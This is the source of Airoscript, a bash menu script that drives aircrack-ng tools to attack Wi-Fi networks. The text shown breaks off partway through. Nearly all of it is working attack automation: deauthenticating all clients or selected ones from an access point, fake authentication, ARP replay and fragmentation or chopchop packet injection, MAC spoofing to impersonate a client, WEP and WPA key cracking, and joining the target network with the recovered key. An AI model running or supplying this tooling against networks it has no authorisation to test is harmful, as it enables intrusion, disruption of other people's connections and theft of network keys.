#! /bin/bash

# Program:	Airoscript                                                          
# Authors:	Base Code by Daouid; Mods & Tweaks by CurioCT and others
# Credits:      Hirte, Befa, Stouf, Mister_X, ASPj , Andrea, Pilotsnipes and darkAudax
# Date:	        26.05.2007
# Version:	SVN TESTING RELEASE FOR AIRCRACK-NG SVN 
#		(needs SVN rev 400 and up)
# 
# Dependencies: aircrack-ng,xterm,grep,awk,drivers capable of injection
#
#		To change color theme just do a search and replace
#
#     Colors:   #Dumping	White	#FFFFFF                                            
#               #Injection	Green	#1DFF00                                            
#               #Association	Red	#FF0009                                            
#               #Deauth	        Blue	#99CCFF                                            
#               #Background	Black	#000000                                            
#                                                                                           
# Notes:  Important  ===>>>  Set variable DEBUG to 1 to enable debugging of errors  <<<===
#

#CardCtl executable (on 2.4 kernels, it is cardctl)
CARDCTL="pccardctl"
DHCPSOFT="dhcpcd"
#
WELCOME="0"
DEBUG="0"
#This is the interface you want to use to perform the attack
#If you dont set this, airoscript will ask you for interface to use
WIFI=""
#This is the rate per second at wich packets will be injected
INJECTRATE="330"
#How many times the deauth attack is run
DEAUTHTIME="5"
#Time between re-association with target AP
AUTHDELAY="80"
KEEPALIVE="30"
#Fudge factor setting
FUDGEFACTOR="2"
#Path to binaries                                     
AIRMON="airmon-ng"		
AIRODUMP="airodump-ng"
AIREPLAY="aireplay-ng"	
AIRCRACK="aircrack-ng"
ARPFORGE="packetforge-ng"
#The path where the data is stored (FOLDER MUST EXIST !)
DUMP_PATH="/wifi"
# Path to your wordlist file (for WPA and WEP dictionnary attack)
WORDLIST="/wifi/wordlist.txt"
#The Mac address used to associate with AP during fakeauth			
FAKE_MAC="00:06:25:02:FF:D8"
# IP of the AP and clients to be used for CHOPCHOP and Fragmentation attack

# Host_IP and Client_IP used for arp generation from xor file (frag and chopchop)

#Host_IP="192.168.1.1"
#Client_IP="192.168.1.37"
#Host_IP="192.168.0.1"
#Client_IP="192.168.0.37"
Host_IP="255.255.255.255"
Client_IP="255.255.255.255"

# Fragmentation IP

#FRAG_HOST_IP="192.168.1.1"
#FRAG_CLIENT_IP="192.168.1.37"
#FRAG_HOST_IP="192.168.0.1"
#FRAG_CLIENT_IP="192.168.0.37"
FRAG_HOST_IP="255.255.255.255"
FRAG_CLIENT_IP="255.255.255.255"

# leave this alone (if you edit this, it will screw up the menu)
CHOICES="1 2 3 4 5 6 7 8 9 10 11 12 13 14 15"
#This is the window size and layout settings
# Upper left window +0+0 (size*size+position+position)
TOPLEFT="-geometry 96x25+0+0"
# Upper right window -0+0
TOPRIGHT="-geometry 70x25-0+0"
# Bottom left window +0-0
BOTTOMLEFT="-geometry 96x25+0-0"
# Bottom right window -0-0
BOTTOMRIGHT="-geometry 70x25-0-0"
TOPLEFTBIG="-geometry 96x60+0+0"
TOPRIGHTBIG="-geometry 70x60-0+0"
##################################################################################
#
#  Functions: these are all the commands used by the script
#
# starts monitor mode on selected interface		
function monitor_interface {
IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
	clear
	echo $IS_MONITOR 
}
# this sets wifi interface if not hard coded in the script
function setinterface {
#INTERFACES=`iwconfig|grep --regexp=^[^:blank:].[:alnum:]|awk '{print $1}'`
#INTERFACES=`iwconfig|egrep "^[a-Z]+[0-9]+" |awk '{print $1}'`
 INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
	clear
	if [ $WIFI =  ]
		then
  echo "#######################################"
  echo "###     Select your interface       ###"
  echo " "
		select WIFI in $INTERFACES; do
		break;
		done
  echo "#######################################"
  echo "### Interface to use is : $WIFI"
	else
		clear 
	fi
}
# this function allows debugging of xterm commands
function debug {
	clear
	if [ $DEBUG = 1 ]
		then
  echo "#######################################"
  echo "###      Debug Mode On              ###"
  echo " "
			HOLD="-hold"
	else
		HOLD=""
	fi
}
# This is another great contribution from CurioCT that allows you to manually enter SSID if none is set
function blankssid {
while true; do
  clear
  echo "#######################################"
  echo "###       Blank SSID detected       ###"
  echo "###    Do you want to in put one    ###"
  echo "###    1) Yes                       ###"
  echo "###    2) No                        ###"
  read yn
  case $yn in
    1 ) Host_ssidinput ; break ;;
    2 ) Host_SSID="" ; break ;;
    * ) echo "unknown response. Try again" ;;
esac
done
}
# This is the input part of previous function
function Host_ssidinput {
  echo "#######################################"
  echo "###       Please enter SSID         ###"
read Host_SSID
set -- ${Host_SSID}
clear
}
# This is the function to select Target from a list
## MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room  
## And HIRTE for making all those great patch and fixing the SSID issue	
function Parseforap {
ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
clear
echo "#######################################"
echo "### Select Target from this list    ###"
echo ""
echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
echo ""
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
 longueur=${#MAC}
   if [ $longueur -ge 17 ]; then
    i=$(($i+1))
    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
    aidlenght=$IDLENGTH
    assid[$i]=$ESSID
    achannel[$i]=$CHANNEL
    amac[$i]=$MAC
    aprivacy[$i]=$PRIVACY
    aspeed[$i]=$SPEED
   fi
done < $DUMP_PATH/dump-02.txt
echo ""
echo "###     Select target              ###"
read choice
idlenght=${aidlenght[$choice]}
ssid=${assid[$choice]}
channel=${achannel[$choice]}
mac=${amac[$choice]}
privacy=${aprivacy[$choice]}
speed=${aspeed[$choice]}
Host_IDL=$idlength
Host_SPEED=$speed
Host_ENC=$privacy
Host_MAC=$mac
Host_CHAN=$channel
acouper=${#ssid}
fin=$(($acouper-idlength))
Host_SSID=${ssid:1:fin}
}
# This is a simple function to ask what type of AP you are looking for
function choosetype {
while true; do
  clear
  echo "#######################################"
  echo "###     Select AP specification     ###"
  echo "###                                 ###"
  echo "###   1) No filter                  ###"
  echo "###   2) OPN                        ###"
  echo "###   3) WEP                        ###"
  echo "###   4) WPA                        ###"
  echo "###   5) WPA1                       ###"
  echo "###   6) WPA2                       ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) ENCRYPT="" ; break ;;
    2 ) ENCRYPT="OPN" ; break ;;
    3 ) ENCRYPT="WEP" ; break ;;
    4 ) ENCRYPT="WPA" ; break ;;
    5 ) ENCRYPT="WPA1" ; break ;;
    6 ) ENCRYPT="WPA2" ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}

# This is a simple function to ask what type of AP you are looking for
function choosefake {
while true; do
  clear
  echo "#######################################"
  echo "###   Select fakeauth method        ###"
  echo "###                                 ###"
  echo "###   1) Conservative               ###"
  echo "###   2) Standard                   ###"
  echo "###   3) Progressive                ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) fakeauth1 ; break ;;
    2 ) fakeauth2 ; break ;;
    3 ) fakeauth3 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}

# This is a simple function to ask what type of scan you want to run
function choosescan {
while true; do

  echo "#######################################"
  echo "###  Select channel to use          ###"
  echo "###                                 ###"
  echo "###   1) Channel Hopping            ###"
  echo "###   2) Specific channel(s)        ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) Scan ; break ;;
    2 ) Scanchan ; break ;;  
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# This function ask after an AP selection for a client sel
function choosetarget {
while true; do
  clear
  echo "#######################################"
  echo "### Do you want to select a client? ###"
  echo "###                                 ###"
  echo "###   1) Yes, only associated       ###"
  echo "###   2) No i dont want to          ###"
  echo "###   3) Try to detect some         ###"
  echo "###   4) Yes show me the clients    ###"
  echo "###   5) Correct the SSID first     ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) listsel2  ; break ;;
    2 ) break ;;
    3 ) clientdetect && clientfound ; break ;;
    4 ) askclientsel ; break ;;
    5 ) Host_ssidinput && choosetarget ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# this ask if the client scan was successfull
function clientfound {
while true; do
  clear
  echo "#######################################"
  echo "###  Did you find desired client?   ###"
  echo "###                                 ###"
  echo "###   1) Yes, someone associated    ###" 
  echo "###   2) No, no clients showed up   ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) listsel3 ; break ;;
    2 ) break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# deauth type sel
function choosedeauth {
while true; do
  clear
  echo "#######################################"
  echo "###   Who do you want to deauth ?   ###"
  echo "###                                 ###"
  echo "###   1) Everybody                  ###"
  echo "###   2) Myself (the Fake MAC)      ###"
  echo "###   3) Selected client            ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) deauthall ; break ;;
    2 ) deauthfake ; break ;;
    3 ) deauthclient ; break ;; 
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# this function ask for attack type
function attackwep {
while true; do
  clear
  echo "#######################################"
  echo "### Attacks not using a client      ###"
  echo "### 1)  Fake auth => Automatic      ###"
  echo "### 2)  Fake auth => Interactive    ###"
  echo "### 3)  Fragmentation attack        ###"
  echo "### 4)  Chopchop attack             ###"
  echo "#######################################"
  echo "### Attacks using a client          ###"
  echo "### 5)  ARP replay => Automatic     ###"
  echo "### 6)  ARP replay => Interactive   ###"
  echo "### 7)  Fragmentation attack        ###"
  echo "### 8)  Chopchop attack             ###"
  echo "#######################################"
  echo "### Injection if xor file generated ###" 
  echo "### 9)  Chopchop injection          ###"
  echo "### 10) Chopchop injection client   ###"
  echo "### 11) Fragment injection          ###"
  echo "### 12) Fragment injection client   ###"
  echo "### 13) ARP inject from xor (PSK)   ###"
  read yn
  echo ""
  case $yn in
    1 ) attack ; break ;;
    2 ) fakeinteractiveattack ; break ;;
    3 ) fragnoclient ; break ;;
    4 ) chopchopattack ; break ;;

    5 ) attackclient ; break ;;
    6 ) interactiveattack ; break ;;
    7 ) fragmentationattack ; break ;;
    8 ) chopchopattackclient ; break ;;

    9 ) chopchopend ; break ;;
   10 ) chopchopclientend ; break ;;
   11 ) fragnoclientend ; break ;;
   12 ) fragmentationattackend ; break ;;
   13 ) pskarp ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# this function ask for attack type
function attackopn {
while true; do
  clear
  echo "#######################################"
  echo "###   Who do you want to deauth     ###"
  echo "###                                 ###"
  echo "###   1) Everybody                  ###"
  echo "###   2) Myself (the Fake MAC)      ###"
  echo "###   3) Selected client            ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) deauthall ; break ;;
    2 ) deauthfake ; break ;;
    3 ) deauthclient ; break ;; 
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# client origin 
function askclientsel {
while true; do
  clear
  echo "#######################################"
  echo "###      Select next step           ###"
  echo "###                                 ###"
  echo "###   1) Detected clients           ###"
  echo "###   2) Manual Input               ###"
  echo "###   3) Associated client list     ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  echo ""
  case $yn in
    1 ) asklistsel ; break ;;
    2 ) clientinput ; break ;;
    3 ) listsel2 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# manual client input
function clientinput {
  echo "#######################################"
  echo "###                                 ###"
  echo "###   Type in client mac now        ###"
  echo "###                                 ###"
  echo "#######################################"
#echo -n "OK, now type in your client MAC: "
read Client_MAC
  echo "#######################################"
  echo "###                                 ###"
  echo "###   You typed: $Client_MAC  ###"
  echo "###                                 ###"
  echo "#######################################"
set -- ${Client_MAC}
}
# associated client or all clients ?
function asklistsel {
while true; do
  clear
  echo "#######################################"
  echo "###      Select next step           ###"
  echo "###                                 ###"
  echo "###   1) Clients of $Host_SSID      ###"
  echo "###   2) Full list (all MACs)       ###"
  echo "###                                 ###"
  echo "#######################################"
if [ "$Host_SSID" = $'\r' ]
  		then
Host_SSID="No SSID has been detected!"
fi
  echo  
read yn
  case $yn in
    1 ) listsel2 ; break ;;
    2 ) listsel1 ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# sel client from list    	
function listsel1 {
HOST=`cat $DUMP_PATH/dump-01.txt | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
	clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###       Select client now         ###"
  echo "###                                 ###"
  echo "#######################################"
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
# sel client from list, shows only associated clients	  	
function listsel2 {
HOST=`cat $DUMP_PATH/dump-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
	clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###       Select client now         ###"
  echo "###  These clients are connected to ###
  echo "###          $Host_SSID             ###"
  echo "###                                 ###"
  echo "#######################################"
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
# sel client from list, shows only associated clients	  	
function listsel3 {
HOST=`cat $DUMP_PATH/$Host_MAC-01.txt | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
	clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###       Select client now         ###"
  echo "###  These clients are connected to ###
  echo "###          $Host_SSID             ###"
  echo "###                                 ###"
  echo "#######################################"
	select CLIENT in $HOST;
		do
		export Client_MAC=` echo $CLIENT | awk '{
				split($1, info, "," )
				print info[1]  }' `	
		break;
	done
}
# reset and killall commands , + ejection/interruption of interface	
function cleanup {
	killall -9 aireplay-ng airodump-ng > /dev/null &
	ifconfig $WIFI down
	#pccardctl eject
	clear
        sleep 2
	#pccardctl insert
	$CARDCTL eject
	sleep 2
	$CARDCTL insert
	ifconfig $WIFI up
	$AIRMON start $WIFI $Host_CHAN
	iwconfig $WIFI
}
# menu listing command	
function menu {
  echo "#######################################"
  echo "### What do you want to do?         ###"
  echo "### 1) Scan    - Scan for target    ###"
  echo "### 2) Select  - Select target      ###"
  echo "### 3) Attack  - Attack target      ###"
  echo "### 4) Crack   - Get target key     ###"
  echo "### 5) Config  - Connect to target  ###"
  echo "### 6) Fakeauth- Auth with target   ###"
  echo "### 7) Deauth  - Deauth from target ###"
  echo "### 8) Reset   - Reset interface    ###"
  echo "### 9) Monitor - Airmon-ng device   ###"
  echo "###10) Quit    - Quits airoscript   ###"
  echo "###11) Test    - Test injection     ###"
  echo "###12) ChangeMac- Change your MAC   ###"			
}
# target listing	
function target {
		clear
  echo "#######################################"
  echo "###                                 ###"
  echo "###   AP SSID   = $Host_SSID"
  echo "###   AP MAC    = $Host_MAC"
  echo "###   AP Chan   =$Host_CHAN"
  echo "###   ClientMAC = $Client_MAC"
  echo "###   AP Encrypt= $Host_ENC             ###"
  echo "###   AP Speed  =$Host_SPEED               ###"
  echo "###                                 ###"
  echo "#######################################"
}  
# interface configuration using found key (tweaks by CurioCT) 	
function configure {
		$AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -s -0 -z $DUMP_PATH/$Host_MAC-01.cap &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
		echo "Using this key $KEY to connect to: $Host_SSID"
		echo ""
		echo "Setting: iwconfig $WIFI mode Managed"
		ifconfig $WIFI down
		sleep 3
		ifconfig $WIFI up
		sleep 2
		iwconfig $WIFI mode Managed ap any rate auto channel $Host_CHAN essid "$Host_SSID" key restricted $KEY 
		sleep 1
		echo "Setting: iwconfig $WIFI essid $Host_SSID"
		iwconfig $WIFI essid "$Host_SSID"
		echo "Setting: iwconfig $WIFI key $KEY"
		iwconfig $WIFI key restricted $KEY
		echo "Setting: $DHCPSOFT $WIFI"
		sleep 1
		iwconfig $WIFI rate auto
		iwconfig $WIFI ap any
		sleep 3
		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
		sleep 3
		$DHCPSOFT $WIFI
		echo "Will now ping google.com"
		ping www.google.com
}
function wpaconfigure {
		$AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
		echo "Using this key $KEY to connect to: $Host_SSID"
		echo ""
		echo "Setting: iwconfig $WIFI mode Managed"
		ifconfig $WIFI down
		sleep 3
		ifconfig $WIFI up
		sleep 2
		iwconfig $WIFI mode Managed ap any rate auto channel $Host_CHAN essid "$Host_SSID" key restricted $KEY 
		sleep 1
		echo "Setting: iwconfig $WIFI essid $Host_SSID"
		iwconfig $WIFI essid "$Host_SSID"
		echo "Setting: iwconfig $WIFI key $KEY"
		iwconfig $WIFI key restricted $KEY
		echo "Setting: $DHCPSOFT $WIFI"
		sleep 1
		iwconfig $WIFI rate auto
		iwconfig $WIFI ap any
		sleep 3
		iwconfig $WIFI ap any rate auto mode Managed channel $Host_CHAN essid "$Host_SSID" key restricted $KEY
		sleep 3
		$DHCPSOFT $WIFI
		echo "Will now ping google.com"
		ping www.google.com
}
##################################################################################
#
#	Attack functions
function witchcrack {
if [ $Host_ENC = "WEP" ]
  		then
		crack
		else
		wpacrack
		fi			
}
function witchattack {
if [ $Host_ENC = "WEP" ]
  		then
		attackwep
		elif [ $Host_ENC = "WPA" ]
		then
		wpahandshake
		else
		attackopn
		fi			
}
function wichchangemac {
while true; do

  echo "#######################################"
  echo "###      Select next step           ###"
  echo "###                                 ###"
  echo "###   1) Change MAC to FAKEMAC      ###"
  echo "###   2) Change MAC to CLIENTMAC    ###"
  echo "###   3) Manual Mac input           ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) fakemacchanger ; break ;;
    2 ) macchanger ; break ;;
    3 ) macinput ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
function macinput {
echo -n "OK, now type in your client MAC: "
read MANUAL_MAC
echo You typed: $MANUAL_MAC
set -- ${MANUAL_MAC}
manualmacchanger
}
function fakemacchanger {
if [ $WIFI = "rausb0" ]
  		then
		fakechangemacrausb
		elif [ $WIFI = "wlan0" ]
		then
		fakechangemacwlan
		elif [ $WIFI = "ath0" ]
		then
		fakechangemacath
		else
		echo "Unknow way to change mac"
		fi			
}
function fakechangemacrausb {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $FAKE_MAC"
ifconfig $WIFI hw ether $FAKE_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor			
}
function fakechangemacwlan {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $FAKE_MAC"
ifconfig $WIFI hw ether $FAKE_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor		
}
function fakechangemacath {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $FAKE_MAC"
ifconfig $WIFI hw ether $FAKE_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor			
}
function macchanger {
if [ $WIFI = "rausb0" ]
  		then
		changemacrausb
		elif [ $WIFI = "wlan0" ]
		then 
		changemacwlan
		elif [ $WIFI = "ath0" ]
		then
		changemacath
		else
		echo "Unknow way to change mac"
		fi			
}
function changemacrausb {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $Client_MAC"
ifconfig $WIFI hw ether $Client_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor			
}
function changemacwlan {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $Client_MAC"
ifconfig $WIFI hw ether $Client_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor			
}
function changemacath {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $Client_MAC"
ifconfig $WIFI hw ether $Client_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor			
}
function manualmacchanger {
if [ $WIFI = "rausb0" ]
  		then
		manualchangemacrausb
		elif [ $WIFI = "wlan0" ]
		then
		manualchangemacwlan
		elif [ $WIFI = "ath0" ]
		then
		manualchangemacath
		else
		echo "Unknow way to change mac"
		fi			
}
function manualchangemacrausb {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $MANUAL_MAC"
ifconfig $WIFI hw ether $MANUAL_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor			
}
function manualchangemacwlan {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $MANUAL_MAC"
ifconfig $WIFI hw ether $MANUAL_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor				
}
function manualchangemacath {
echo "ifconfig $WIFI down"
ifconfig $WIFI down
echo "iwconfig $WIFI mode managed"
iwconfig $WIFI mode managed
sleep 2
echo "ifconfig $WIFI hw ether $MANUAL_MAC"
ifconfig $WIFI hw ether $MANUAL_MAC
echo "ifconfig $WIFI up"
ifconfig $WIFI up
echo "ifconfig $WIFI mode monitor"
iwconfig $WIFI mode monitor				
}
function witchconfigure {
if [ $Host_ENC = "WEP" ]
  		then
		configure
		else
		wpaconfigure
		fi			
}
# aircrack command 
function crackptw   {
	x-terminal-emulator $HOLD -title "Aircracking-PTW: $Host_SSID" $TOPRIGHT --notabbar --nomenubar --noclose -e $AIRCRACK -z -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
}
function crackstd   {
	x-terminal-emulator $HOLD -title "Aircracking: $Host_SSID" $TOPRIGHT --notabbar --nomenubar --noclose -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGEFACTOR -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction
}
function crackman {
echo -n "type fudge factor"
read FUDGE_FACTOR
echo You typed: $FUDGE_FACTOR
set -- ${FUDGE_FACTOR}
echo -n "type encryption size 64,128 etc..."
read ENC_SIZE
echo You typed: $ENC_SIZE
set -- ${ENC_SIZE}

	x-terminal-emulator $HOLD -title "Manual cracking: $Host_SSID" $TOPRIGHT --notabbar --nomenubar --noclose -e $AIRCRACK -a 1 -b $Host_MAC -f $FUDGE_FACTOR -n $ENC_SIZE -0 -s $DUMP_PATH/$Host_MAC-01.cap & menufonction

}
function crack {
while true; do

  echo "#######################################"
  echo "###      WEP CRACKING OPTIONS       ###"
  echo "###                                 ###"
  echo "###   1) aircrack-ng PTW attack     ###"
  echo "###   2) aircrack-ng standard       ###"
  echo "###   3) aircrack-ng user options   ###"
  echo "###                                 ###"
  echo "#######################################"
  read yn
  case $yn in
    1 ) crackptw ; break ;;
    2 ) crackstd ; break ;;
    3 ) crackman ; break ;;
    * ) echo "unknown response. Try again" ;;
  esac
done 
}
# WPA attack function
function wpahandshake {
	clear
	rm -rf $DUMP_PATH/$Host_MAC*
	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
}
function wpacrack {
xterm $HOLD $TOPRIGHT -title "Aircracking: $Host_SSID" -hold -e $AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction
}
function Scan {
	clear
	rm -rf $DUMP_PATH/dump*
#	$AIRMON start $WIFI
	xterm $HOLD -title "Scanning for targets" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $WIFI
}
# This scan for targets on a specific channel
function Scanchan {
  echo "#######################################"
  echo "###    Input channel number         ###"
  echo "###                                 ###"
  echo "###  A single number   6            ###"
  echo "###  A range           1-5          ###"
  echo "###  Multiple channels 1,1,2,5-7,11 ###"
  echo "###                                 ###"
  echo "#######################################"
#echo -n "On which channel would you like to scan ? ==> "
read channel_number
echo You typed: $channel_number
set -- ${channel_number}
	clear
	rm -rf $DUMP_PATH/dump*
	$AIRMON start $WIFI $channel_number
	xterm $HOLD -title "Scanning for targets on channel $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP -w $DUMP_PATH/dump --channel "$channel_number" --encrypt $ENCRYPT -a $WIFI
}
function capture {
	clear
	rm -rf $DUMP_PATH/$Host_MAC*
	xterm $HOLD -title "Capturing data on channel: $Host_CHAN" $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
}
function deauthall {
	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking everybody from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC $WIFI
}
function deauthclient {
	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $Client_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $Client_MAC $WIFI
}
function deauthfake {
	xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#99CCFF" -title "Kicking $FAKE_MAC from: $Host_SSID" -e $AIREPLAY --deauth $DEAUTHTIME -a $Host_MAC -c $FAKE_MAC $WIFI
}
function fakeauth {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI
}
function fakeauth1 {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 6000 -o 1 -q 10 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
}
function fakeauth2 {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 0 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
}
function fakeauth3 {
xterm $HOLD -title "Associating with: $Host_SSID " $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e $AIREPLAY --fakeauth 5 -o 10 -q 1 -e "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI & menufonction
}
# This is a set of command to manually kick all clients from selected AP to discover them
function clientdetect {
	capture & deauthall
}
# attack against client when a previous attack has stalled
function solointeractiveattack {
	xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -b $Host_MAC -p 0841 -c FF:FF:FF:FF:FF:FF -x $INJECTRATE & menufonction
}
# fake attack function	
function attack {
	capture & xterm $HOLD -title "Injection: Host: $Host_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -h $FAKE_MAC  -x $INJECTRATE & fakeauth & menufonction
}
# client type attack function
function attackclient {
	capture & xterm $HOLD -title "Injection: Host : $Host_MAC CLient : $Client_MAC" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --arpreplay -b $Host_MAC -h $Client_MAC -x $INJECTRATE & menufonction
}
# interactive attack with client
function interactiveattack {
	capture & xterm $HOLD -title "Interactive Packet Sel on: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -x $INJECTRATE & menufonction
}
# interactive attack with fake mac
function fakeinteractiveattack {
	capture & xterm $HOLD -title "Interactive Packet Sel on Host: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --interactive -p 0841 -c FF:FF:FF:FF:FF:FF -b $Host_MAC -x $INJECTRATE & fakeauth & menufonction
}

# Unstable allround function
function airomatic {
